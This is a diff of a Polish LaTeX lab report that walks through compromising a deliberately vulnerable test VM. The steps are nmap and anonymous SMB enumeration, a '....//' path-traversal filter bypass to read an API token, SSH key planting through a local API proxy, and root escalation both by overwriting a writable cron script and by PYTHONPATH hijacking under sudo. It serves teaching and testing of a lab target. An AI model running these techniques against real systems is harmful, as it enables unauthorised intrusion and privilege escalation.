@@ -10,23 +10,31 @@ Na rysunku \ref{fig:sekwencja} przedstawiono przebieg komunikacji pomiędzy stac
 \section{Etap 1: Rekonesans sieciowy i enumeracja zasobu Samba}
 \label{sec:etap1-samba}
 
-Pierwszym krokiem procedury weryfikacyjnej była identyfikacja otwartych portów TCP udostępnianych przez zaporę UFW na adresie \texttt{192.168.56.101} oraz weryfikacja anonimowego dostępu do usługi plikowej Samba na porcie \texttt{445/tcp} \cite{samba}.
+Pierwszym krokiem procedury weryfikacyjnej było przeskanowanie portów TCP maszyny \texttt{192.168.56.101} w celu weryfikacji polityki zapory UFW.
 
-\begin{lstlisting}[language=bash, caption={Enumeracja zasobów SMB oraz pobranie pliku deployment-notes.txt}, label={lst:e2e-stage1}]
+\begin{lstlisting}[language=bash, caption={Skanowanie otwartych portów TCP na hoście 192.168.56.101 narzędziem nmap}, label={lst:e2e-nmap}]
 $ sudo nmap -sV -p 22,445,5000,8080 192.168.56.101
 PORT     STATE    SERVICE     VERSION
 22/tcp   open     ssh         OpenSSH 10.2p1 Ubuntu 2ubuntu3.8 (Ubuntu Linux; protocol 2.0)
 445/tcp  open     netbios-ssn Samba smbd 4.6.2
 5000/tcp filtered upnp
 8080/tcp open     http        nginx 1.28.3 (Ubuntu)
+\end{lstlisting}
 
+Jak wynika z listingu \ref{lst:e2e-nmap}, port \texttt{5000/tcp} jest blokowany z zewnątrz przez zaporę UFW (\texttt{filtered}), a dostępne pozostają wyłącznie usługi SSH, Samba oraz serwer HTTP Nginx. Następnie wylistowano dostępne udziały sieciowe usługi Samba bez podawania poświadczeń (flaga \texttt{-N}).
+
+\begin{lstlisting}[language=bash, caption={Wylistowanie anonimowych udziałów SMB narzędziem smbclient}, label={lst:e2e-smb-list}]
 $ smbclient -N -L //192.168.56.101/
         Sharename       Type      Comment
         ---------       ----      -------
         public          Disk      VulnBox Public Deployment Notes
         IPC$            IPC       IPC Service (VulnBox File Server)
 SMB1 disabled -- no workgroup available
+\end{lstlisting}
 
+Po zidentyfikowaniu publicznego udziału \texttt{public} (listing \ref{lst:e2e-smb-list}) pobrano bezpośrednio na standardowe wyjście pozostawiony w nim plik \texttt{deployment-notes.txt}.
+
+\begin{lstlisting}[language=bash, caption={Pobranie i odczyt pliku deployment-notes.txt z udziału public}, label={lst:e2e-smb-get}]
 $ smbclient -N //192.168.56.101/public -c "get deployment-notes.txt -"
 ========================================================================
 VulnBox - Internal Deployment Notes (Draft v1.2)
@@ -48,14 +56,14 @@ Remove this draft file from /srv/samba/public before production handover.
 ========================================================================
 \end{lstlisting}
 
-Jak wynika z listingu \ref{lst:e2e-stage1}, port \texttt{5000/tcp} jest poprawnie blokowany z zewnątrz przez zaporę UFW (\texttt{filtered}), natomiast zasób \texttt{//192.168.56.101/public} pozwala na anonimowe pobranie pliku \texttt{deployment-notes.txt}, który ujawnia lokalizację plików \texttt{/var/www/vulnbox/index.php} oraz \texttt{/opt/internal\_api/config.ini}.
+Notatka pobrana w listingu \ref{lst:e2e-smb-get} ujawnia parametry portalu diagnostycznego na porcie \texttt{8080/tcp}, lokalizację pliku \path{/opt/internal_api/config.ini} z tokenem API oraz adres wewnętrznego serwisu Flask (\texttt{127.0.0.1:5000}).
 
 \section{Etap 2: Weryfikacja portalu WWW (:8080) i odczyt konfiguracji API}
 \label{sec:etap2-web}
 
-W drugim etapie wykorzystano informacje pozyskane z notatki do zbadania portalu diagnostycznego działającego na porcie \texttt{8080/tcp}. Za pomocą zagnieżdżonej sekwencji \texttt{....//} ominięto jednoprzebiegowy filtr \texttt{str\_replace('../', '', ...)} w parametrze \texttt{?log=}, co pozwoliło na odczyt kodu źródłowego \texttt{index.php} oraz pliku konfiguracyjnego \texttt{/opt/internal\_api/config.ini} w kontekście uprawnień grupy \texttt{www-data}.
+W drugim etapie sprawdzono najpierw punkt diagnostyczny \texttt{?module=status} portalu WWW, potwierdzając jego działanie oraz obsługiwane parametry wejściowe.
 
-\begin{lstlisting}[language=bash, caption={Weryfikacja błędu normalizacji ścieżki i odczyt tokenu X-Internal-Token}, label={lst:e2e-stage2}]
+\begin{lstlisting}[language=bash, caption={Weryfikacja statusu portalu WWW na porcie 8080/tcp}, label={lst:e2e-web-status}]
 $ curl -s "http://192.168.56.101:8080/?module=status"
 === VulnBox Diagnostics Portal ===
 Service: vulnbox-web (Nginx + PHP-FPM)
@@ -66,7 +74,11 @@ Usage:
   ?module=status                     - Display service health summary
   ?log=<filename>                    - View diagnostic log from /var/log/webapp/
   ?proxy_path=<endpoint>&token=<tok> - Query local management API on 127.0.0.1:5000
+\end{lstlisting}
 
+Następnie za pomocą zagnieżdżonej sekwencji \texttt{....//....//....//} ominięto jednoprzebiegowy filtr \texttt{str\_replace('../', '', ...)} w parametrze \texttt{?log=}, co pozwoliło na odczyt pliku konfiguracyjnego \path{/opt/internal_api/config.ini} w kontekście uprawnień grupy \texttt{www-data}.
+
+\begin{lstlisting}[language=bash, caption={Odczyt pliku /opt/internal\_api/config.ini przez parametr ?log=}, label={lst:e2e-web-traversal}]
 $ curl -s "http://192.168.56.101:8080/?log=....//....//....//opt/internal_api/config.ini"
 [VulnBox Log Viewer] Requested path: /var/log/webapp/../../../opt/internal_api/config.ini
 
@@ -83,21 +95,25 @@ target_account = dev
 authorized_keys_path = /home/dev/.ssh/authorized_keys
 \end{lstlisting}
 
-W wyniku zapytania z listingu \ref{lst:e2e-stage2} uzyskano wartość tokenu autoryzacyjnego oraz potwierdzono, że serwis wewnętrzny zarządza plikiem \texttt{/home/dev/.ssh/authorized\_keys}.
+W wyniku zapytania z listingu \ref{lst:e2e-web-traversal} uzyskano statyczny token autoryzacyjny oraz potwierdzono, że serwis wewnętrzny zarządza plikiem \path{/home/dev/.ssh/authorized_keys}.
 
 \section{Etap 3: Komunikacja z lokalnym serwisem Flask i dostęp SSH na konto dev}
 \label{sec:etap3-flask}
 
-Ponieważ serwis Flask nasłuchuje wyłącznie na interfejsie lokalnym (\texttt{127.0.0.1:5000}), komunikację z nim zrealizowano za pośrednictwem wbudowanego w portal WWW parametru mostka lokalnego \texttt{?proxy\_path=}. Przekazując pozyskany w etapie 2 token oraz klucz publiczny SSH analityka, zarejestrowano klucz dla użytkownika \texttt{dev}, a następnie nawiązano sesję SSH na porcie \texttt{22/tcp} i odczytano pierwszą flagę.
+Ponieważ serwis Flask nasłuchuje wyłącznie na interfejsie lokalnym (\texttt{127.0.0.1:5000}), komunikację z nim zrealizowano przez parametr mostka \texttt{?proxy\_path=}. Przekazując pozyskany w etapie 2 token, zweryfikowano metadane API oraz przesłano klucz publiczny SSH analityka.
 
-\begin{lstlisting}[language=bash, caption={Rejestracja klucza SSH przez lokalne API (127.0.0.1:5000), logowanie SSH i odczyt user.txt}, label={lst:e2e-stage3}]
+\begin{lstlisting}[language=bash, caption={Weryfikacja tokenu i rejestracja klucza SSH przez mostek ?proxy\_path=}, label={lst:e2e-api-sshkey}]
 $ curl -s "http://192.168.56.101:8080/?proxy_path=/api/v1/info&token=vb-internal-9f8e7d6c5b4a3f2e1d0c"
 {"authorized_keys_path":"/home/dev/.ssh/authorized_keys","endpoints":["/health","/api/v1/info","/api/v1/ssh-key"],"managed_account":"dev","service":"vulnbox-internal-api"}
 
 $ curl -s -X POST "http://192.168.56.101:8080/?proxy_path=/api/v1/ssh-key&token=vb-internal-9f8e7d6c5b4a3f2e1d0c" \
        --data-urlencode "ssh_key=$(cat ~/.ssh/id_ed25519.pub)"
 {"account":"dev","authorized_keys_path":"/home/dev/.ssh/authorized_keys","status":"registered"}
+\end{lstlisting}
 
+Po dopisaniu klucza przez API (listing \ref{lst:e2e-api-sshkey}) nawiązano interaktywną sesję SSH na porcie \texttt{22/tcp} jako użytkownik \texttt{dev} i odczytano pierwszą flagę z pliku \path{/home/dev/user.txt}.
+
+\begin{lstlisting}[language=bash, caption={Logowanie SSH na konto dev i odczyt flagi /home/dev/user.txt}, label={lst:e2e-ssh-user}]
 $ ssh -i ~/.ssh/id_ed25519 dev@192.168.56.101
 Welcome to Ubuntu 26.04.1 LTS (GNU/Linux 7.0.0-44-generic x86_64)
 
@@ -106,19 +122,19 @@ uid=1001(dev) gid=1001(dev) groups=1001(dev)
 FLAG{Us3r_Sh3ll!7xK9#mP2@vQ4_d3v%8nR1}
 \end{lstlisting}
 
-Poprawne zalogowanie przez SSH na konto \texttt{dev} oraz odczyt zawartości pliku \texttt{/home/dev/user.txt} (listing \ref{lst:e2e-stage3}) potwierdzają ukończenie części użytkownika nieuprzywilejowanego.
+Poprawne uwierzytelnienie kluczem SSH oraz odczyt flagi \path{/home/dev/user.txt} (listing \ref{lst:e2e-ssh-user}) potwierdzają ukończenie etapu użytkownika nieuprzywilejowanego.
 
 \section{Etap 4: Weryfikacja dwóch ścieżek eskalacji do konta root}
 \label{sec:etap4-root}
 
-Z poziomu sesji SSH użytkownika \texttt{dev} zweryfikowano zaprojektowane ścieżki prowadzące do uzyskania pełnych uprawnień administracyjnych \texttt{root}.
+Z poziomu otwartej sesji SSH użytkownika \texttt{dev} zweryfikowano obie niezależne ścieżki prowadzące do uprawnień \texttt{root} i odczytu flagi \path{/root/root.txt}.
 
 \subsection{Ścieżka A: Zadanie cykliczne Cron i skrypt z uprawnieniami grupy dev}
 \label{subsec:sciezka-a-cron}
 
-Analiza katalogu \path{/opt/admin/hooks/} oraz pliku konfiguracyjnego \path{/etc/cron.d/vulnbox-maintenance} potwierdziła, że skrypt \path{/opt/admin/hooks/pre_backup.sh} posiada uprawnienia \texttt{0775} i grupę \texttt{dev}. Nadpisanie jego zawartości skutkuje automatycznym wykonaniem polecenia przez demona \texttt{cron} jako \texttt{root}.
+W pierwszym kroku odczytano definicję zadania \path{/etc/cron.d/vulnbox-maintenance} oraz sprawdzono uprawnienia skryptu \path{/opt/admin/hooks/pre_backup.sh}.
 
-\begin{lstlisting}[language=bash, caption={Weryfikacja ścieżki zadaniowej cron (pre\_backup.sh) z poziomu konta dev}, label={lst:e2e-stage4a}]
+\begin{lstlisting}[language=bash, caption={Inspekcja zadania cron oraz uprawnień pliku pre\_backup.sh}, label={lst:e2e-cron-inspect}]
 dev@vulnbox:~$ cat /etc/cron.d/vulnbox-maintenance
 # /etc/cron.d/vulnbox-maintenance
 SHELL=/bin/bash
@@ -127,16 +143,22 @@ PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 
 dev@vulnbox:~$ ls -la /opt/admin/hooks/pre_backup.sh
 -rwxrwxr-x 1 root dev 106 Nov 23 21:15 /opt/admin/hooks/pre_backup.sh
+\end{lstlisting}
 
-dev@vulnbox:~$ cat << 'EOF' > /opt/admin/hooks/pre_backup.sh
+Z uwagi na uprawnienia \texttt{0775} dla grupy \texttt{dev} (listing \ref{lst:e2e-cron-inspect}), otwarto plik \path{/opt/admin/hooks/pre_backup.sh} w edytorze \texttt{nano} (\texttt{nano /opt/admin/hooks/pre\_backup.sh}) i zapisano w nim kod przedstawiony na listingu \ref{lst:e2e-cron-nano}, zachowując bit wykonywalności.
+
+\begin{lstlisting}[style=code, language=bash, caption={Zawartość skryptu /opt/admin/hooks/pre\_backup.sh zapisana w edytorze nano}, label={lst:e2e-cron-nano}]
 #!/usr/bin/env bash
 set -euo pipefail
 id > /tmp/cron_verify.out
 cat /root/root.txt >> /tmp/cron_verify.out
 chmod 0600 /tmp/cron_verify.out
 chown dev:dev /tmp/cron_verify.out
-EOF
+\end{lstlisting}
 
+Po odczekaniu jednego cyklu harmonogramu (\texttt{sleep 65}) odczytano utworzony przez demona \texttt{cron} plik wynikowy.
+
+\begin{lstlisting}[language=bash, caption={Odczyt wyniku wykonania zadania cron i flagi /root/root.txt}, label={lst:e2e-cron-exec}]
 dev@vulnbox:~$ sleep 65 && cat /tmp/cron_verify.out
 uid=0(root) gid=0(root) groups=0(root)
 FLAG{R00t_Pwn3d!9zW6@kL3#bT8_sys%4mX2}
@@ -145,15 +167,18 @@ FLAG{R00t_Pwn3d!9zW6@kL3#bT8_sys%4mX2}
 \subsection{Ścieżka B: Reguła sudoers.d i przechwycenie modułu Pythona}
 \label{subsec:sciezka-b-sudo}
 
-Zweryfikowano regułę \texttt{sudo -l}, która pozwala użytkownikowi \texttt{dev} na uruchomienie \path{/usr/bin/python3} z argumentem \path{/opt/admin/maintenance.py} jako \texttt{root} z zachowaniem zmiennej środowiskowej \texttt{PYTHONPATH} (\texttt{SETENV: NOPASSWD}). Utworzenie pomocniczego modułu \texttt{/tmp/status\_helper.py} i przekazanie ścieżki \texttt{PYTHONPATH=/tmp} powoduje załadowanie modułu jako \texttt{root} i odczyt flagi \texttt{/root/root.txt}.
+Niezależnie zweryfikowano uprawnienia \texttt{sudo -l} oraz prawa do modułu \path{/opt/admin/status_helper.py}.
 
-\begin{lstlisting}[language=bash, caption={Weryfikacja ścieżki sudoers.d z wykorzystaniem zmiennej PYTHONPATH}, label={lst:e2e-stage4b}]
+\begin{lstlisting}[language=bash, caption={Weryfikacja reguły sudo -l oraz uprawnień modułu status\_helper.py}, label={lst:e2e-sudo-inspect}]
 dev@vulnbox:~$ sudo -l && ls -la /opt/admin/status_helper.py
 User dev may run the following commands on vulnbox:
     (root) SETENV: NOPASSWD: /usr/bin/python3 /opt/admin/maintenance.py
 -rw-rw-r-- 1 root dev 344 Nov 23 21:15 /opt/admin/status_helper.py
+\end{lstlisting}
 
-dev@vulnbox:~$ cat << 'EOF' > /tmp/status_helper.py
+Korzystając z opcji \texttt{SETENV} (listing \ref{lst:e2e-sudo-inspect}), utworzono w edytorze \texttt{nano} (\texttt{nano /tmp/status\_helper.py}) pomocniczy moduł Pythona odczytujący flagę administratora (listing \ref{lst:e2e-sudo-nano}).
+
+\begin{lstlisting}[style=code, language=Python, caption={Zawartość modułu /tmp/status\_helper.py utworzona w edytorze nano}, label={lst:e2e-sudo-nano}]
 import os
 from pathlib import Path
 
@@ -162,8 +187,11 @@ def collect_system_summary():
         "euid": os.geteuid(),
         "root_flag": Path("/root/root.txt").read_text(encoding="utf-8").strip(),
     }
-EOF
+\end{lstlisting}
 
+Następnie uruchomiono skrypt \path{/opt/admin/maintenance.py} przez \texttt{sudo} z przekazaniem \texttt{PYTHONPATH=/tmp}, co spowodowało załadowanie podstawionego modułu w kontekście \texttt{root} i natychmiastowe wypisanie zawartości pliku \path{/root/root.txt}.
+
+\begin{lstlisting}[language=bash, caption={Wykonanie maintenance.py ze zmienną PYTHONPATH=/tmp i odczyt root.txt}, label={lst:e2e-sudo-exec}]
 dev@vulnbox:~$ sudo PYTHONPATH=/tmp /usr/bin/python3 /opt/admin/maintenance.py
 [VulnBox Maintenance] System summary: {"euid": 0, "root_flag": "FLAG{R00t_Pwn3d!9zW6@kL3#bT8_sys%4mX2}"}
 \end{lstlisting}
